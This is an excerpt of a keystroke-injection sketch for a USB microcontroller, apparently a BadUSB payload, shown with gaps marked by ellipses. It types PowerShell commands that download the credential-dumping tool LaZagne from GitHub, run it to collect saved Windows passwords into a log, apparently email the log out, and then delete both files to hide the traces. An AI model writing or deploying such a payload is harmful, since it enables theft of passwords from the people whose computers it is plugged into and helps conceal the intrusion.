...
String x64 = "https://github.com/Screetsec/Brutal/raw/master/tools/lazagne/laZagne.exe";
String x32 = "https://github.com/Screetsec/Brutal/raw/master/tools/lazagne/laZagne.exe";
...
void setup()
{
  ...
  delay(500);
  Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('%link%','laZagne.exe')");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(500);
  Keyboard.print("laZagne.exe>Log.txt");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  ...
  delay(500);
  Keyboard.print("$ReportEmail.Subject = 'Getl All Windows Passwords'");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  ...
  delay(500);
  Keyboard.print("del /Q Log.txt & del  /Q laZagne.exe");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
